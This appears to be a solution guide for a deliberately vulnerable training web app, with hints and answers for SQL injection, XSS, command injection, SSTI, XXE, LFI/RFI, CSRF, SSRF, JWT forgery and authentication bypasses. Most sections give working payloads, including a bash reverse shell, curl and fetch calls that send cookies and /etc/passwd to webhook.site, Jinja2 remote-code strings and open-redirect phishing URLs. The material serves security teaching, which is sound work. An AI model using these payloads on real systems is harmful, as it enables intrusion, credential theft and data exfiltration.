Authentication & Authorization Attacks

Hint: The login query uses string concatenation. What happens if you close the string and add your own SQL?
Solution:
Username: admin' OR '1'='1' --
Password: anything

Or: Username: admin'-- Password: anything
The query becomes: SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

Hint: Try logging in with a valid username and wrong password vs a completely invalid username. Are the error messages different?
Solution:
/login - "User not found" vs "Invalid password" reveals valid usernames
/register - "Username 'X' is already taken" confirms existing users
/reset-password - "No account found" vs success message reveals email existence

Use Burp Intruder with a username wordlist and filter by response content/size.

Hint: Accounts lock after 5 attempts, but what if you spray one password across many users?
Solution:
Password spray: ffuf -request login.req -request-proto http -mode clusterbomb -w users.txt:FUZZ_USER -w passwords.txt:FUZZ_PASS -fr "User not found|Invalid password"

Try common passwords: password123, letmein, qwerty, dragon against all discovered usernames.

Hint: The MFA form has a hidden username field. What if you authenticate as one user but submit another user's name? Also: is the MFA code tied to a specific user?
Solution 1 - Username Swap: Log in as jsmith (MFA-enabled), intercept the MFA form, change the hidden username field to agarcia. Submit code 654321. You'll be logged in as agarcia.

Solution 2 - Code Reuse: MFA code 123456 (admin's) works for any user since validation checks the codes table globally, not per-user.

Solution 3 - Brute Force: Only 6-digit numeric code = 1,000,000 possibilities. Use Burp Intruder with numeric payloads 000000-999999.

Hint: Change the ID number in the URL. Does the application check if you're authorized to view that resource?
Solution:
/employees/1001 through /employees/1010 - view any employee including SSN and salary
/support/ticket/1 through /support/ticket/4 - view anyone's tickets
/messages/1 - read other users' private messages
/api/v1/users/1 through /api/v1/users/10 - API BOLA

Use Burp Intruder or ffuf to enumerate: ffuf -u http://localhost:5000/employees/FUZZ -w numbers.txt -H "Cookie: session=..."

Hint: The profile edit form has a hidden user_id field. The admin panel doesn't check your role. The API admin endpoint accepts any valid JWT.
Horizontal: On /profile/edit, change the hidden user_id field from your ID to another user's ID. Their profile gets updated.

Vertical: Any authenticated user can access /admin - no role check exists. You can delete users, change roles, etc.
Similarly, /admin/update-role lets any user promote themselves to admin.

API: GET /api/v1/admin/users with any valid JWT token returns all users - no admin check. PUT /api/v1/users/1/update with {"role":"admin"} lets any user promote any account.

Hint: The JWT secret is very weak. Also, what happens if you set the algorithm to "none"?
Solution 1 - Weak Secret: JWT secret is literally secret. Crack with: john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

Solution 2 - Algorithm None:
1. Get a valid JWT from /api/v1/login
2. Decode the header and change "alg": "HS256" to "alg": "none"
3. Change payload: "role": "admin"
4. Re-encode header.payload. (no signature needed)
5. Use: curl -H "Authorization: Bearer eyJ..." /api/v1/admin/users

Hint: The reset token is an MD5 hash. What inputs might have been used to generate it?
Solution: Token = md5(user_id + unix_timestamp). If you know the user's ID and approximate time of request, you can brute-force the token.
for ts in range(approx_time-60, approx_time+60): print(hashlib.md5(f"{user_id}{ts}".encode()).hexdigest())

Hint: After login, the next parameter controls where you're redirected. Is it validated?
Solution:
/login?next=https://evil.com - after login, redirects to external site
/logout?return=https://evil.com - after logout, redirects to attacker page
/redirect?url=https://evil.com - direct unvalidated redirect

Use in phishing: https://thyhe.com/login?next=https://evil-thyhe-lookalike.com/login

Hint: The filter returns products or empty. Ask true/false questions using AND conditions.
Boolean-based:
True: /products/filter?category=Security' AND '1'='1 (returns products)
False: /products/filter?category=Security' AND '1'='2 (returns empty)

Extract data char-by-char:
/products/filter?category=Security' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='a

/api/v1/users/check?username=admin' AND substr(password,1,1)='a'--
Returns {"exists": true} or {"exists": false}

Automate with sqlmap: sqlmap -u "http://localhost:5000/products/filter?category=test" --batch --dump

Cross-Site Scripting (XSS)

Hint: Your search term is reflected on the page. The template uses |safe filter.
/products/search?q=<script>alert('XSS')</script>
/products/search?q=<img src=x onerror=alert(document.cookie)>

/news?tag=<img src=x onerror=alert(1)>

/error?msg=<script>alert(document.cookie)</script>

Hint: Text fields are stored in the database and rendered with |safe. Inject HTML/JS that will execute for every viewer.
Profile Bio: Edit your bio to: <script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>

Product Review: Submit review: <img src=x onerror="new Image().src='https://webhook.site/ID?c='+document.cookie">

Support Ticket: Create ticket with content: <script>alert('Stored XSS')</script> - fires for admin viewing tickets

Messages: Send message body: <script>alert(document.domain)</script>

Hint: Check the page source. JavaScript reads from the URL and writes to innerHTML without sanitization.
News page: /news#<img src=x onerror=alert(1)>
The hash is decoded and placed in innerHTML via JavaScript.

Welcome page: /welcome?name=<img src=x onerror=alert(document.cookie)>
The name parameter is read client-side and injected into DOM.

Key: No server request in Network tab = DOM-based, not reflected.

Command Injection

Hint: The input is passed directly to shell_exec(). Try command separators: ; | && ||
8.8.8.8; whoami
8.8.8.8; cat /etc/passwd
8.8.8.8 | id
8.8.8.8 && ls -la /

Reverse shell: 8.8.8.8; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
(Set up listener: nc -lvnp 4444)

Hint: Semicolons are filtered. But what about pipe |, ampersand &, backticks, or $()?
example.com | whoami
example.com && id
example.com || cat /etc/passwd
`whoami`.example.com (backtick injection)
$(whoami).example.com (command substitution)

Hint: No output is shown. Use time-based confirmation (sleep) or out-of-band callbacks (webhook.site, Burp Collaborator).
Time-based: 8.8.8.8; sleep 10 - if response takes 10+ seconds, injection confirmed

Out-of-band: 8.8.8.8; curl https://webhook.site/YOUR-ID?cmd=$(whoami)
8.8.8.8; wget https://webhook.site/YOUR-ID/$(id|base64)

Data exfil: 8.8.8.8; curl -d @/etc/passwd https://webhook.site/YOUR-ID

Server-Side Template Injection (SSTI)

Hint: Input is rendered as a Jinja2 template. Try {{"{{"}}7*7{{"}}"}} - if it shows 49 in the HTML source, SSTI is confirmed.
Detection: {{"{{"}}7*7{{"}}"}} → returns 49

Read files:
{{"{{"}}''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read(){{"}}"}}

RCE (Jinja2):
{{"{{"}}config.__class__.__init__.__globals__['os'].popen('whoami').read(){{"}}"}}
{{"{{"}}request.application.__globals__.__builtins__.__import__('os').popen('id').read(){{"}}"}}

Simpler RCE:
{{"{{" }}self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read(){{"}}"}}

All three endpoints (/profile/greeting, /reports/generate, /reports/email-preview) are vulnerable to the same payloads.

XML External Entity (XXE)

Hint: The XML parser has entity resolution enabled. Define an external entity that reads a local file.
Read /etc/passwd: 
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<report>
  <title>&xxe;</title>
  <data>test</data>

Read app source: Change to file:///opt/bugbounty/thyhe/app.py

API XXE:
curl -X POST http://localhost:5000/api/v1/data/import -H "Content-Type: application/xml" -d '<above payload>'

SSRF via XXE:
<!ENTITY xxe SYSTEM "http://127.0.0.1:5000/internal/admin">

Insecure File Upload

Hint: Documents: client-side JS validation only. Avatar: MIME type check only. Support: extension blocklist only.
Documents (client-side bypass): Disable JavaScript or intercept with Burp, change filename to shell.py

Avatar (MIME bypass): Upload a .py file but set Content-Type to image/jpeg in Burp:
Content-Type: image/jpeg with file content: import os; os.system('id')

Support (blocklist bypass): Blocked: .php, .exe, .sh, .bat, .cmd
Bypass with: .phtml, .php5, .phar, .py, .pl, .rb, .jsp

Verify: Files uploaded to /uploads/filename - access at http://localhost:5000/uploads/shell.py

Local/Remote File Inclusion (LFI/RFI)

Hint: The file parameter is appended to a base path. Use ../ to traverse directories. The /pages endpoint has a non-recursive filter.
Basic LFI (/documents/view):
/documents/view?file=../../../etc/passwd
/documents/view?file=../admin_credentials.txt
/documents/view?file=../../app.py - read the app source

Filter bypass (/pages): The filter removes ../ once (non-recursive).
/pages?page=....//....//....//etc/passwd
..././ becomes ../ after filter

RFI (/resources):
/resources?src=http://evil.com/malicious.txt
/resources?src=http://127.0.0.1:5000/internal/admin (SSRF via RFI)

Interesting files: /etc/passwd, /etc/shadow (if readable), /proc/self/environ, app.py

Cross-Site Request Forgery (CSRF)

Hint: Profile edit and ticket creation have no CSRF tokens. Settings has a token but only checks if it exists, not its value.
Profile CSRF (no token): 
<html><body>
<form id="csrf" action="http://localhost:5000/profile/edit" method="POST">
  <input name="user_id" value="1">
  <input name="bio" value="HACKED BY CSRF">
  <input name="email" value="hacker@evil.com">
  <input name="department" value="Pwned">
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>
Settings CSRF (weak token): The csrf_token field just needs to exist - any value works: 
<form id="csrf" action="http://localhost:5000/settings" method="POST">
  <input name="csrf_token" value="anything">
  <input name="email" value="hacker@evil.com">
  <input name="password" value="hacked">
</form>
<script>document.getElementById('csrf').submit();</script>

Server-Side Request Forgery (SSRF)

Hint: The server fetches whatever URL you provide. Try pointing it at internal services (127.0.0.1, localhost).
URL Checker (full SSRF):
http://127.0.0.1:5000/internal/admin - returns internal admin page with secrets
http://127.0.0.1:5000/internal/status - returns internal status with flag
http://169.254.169.254/latest/meta-data/ - AWS metadata (in cloud)

Webhook (blind SSRF): Confirms server makes outbound requests
Set URL to http://127.0.0.1:5000/internal/admin or https://webhook.site/YOUR-ID

Vendor Compare (SSRF):
http://127.0.0.1:5000/internal/status - returns flag
Fuzz internal ports: http://127.0.0.1:PORT/
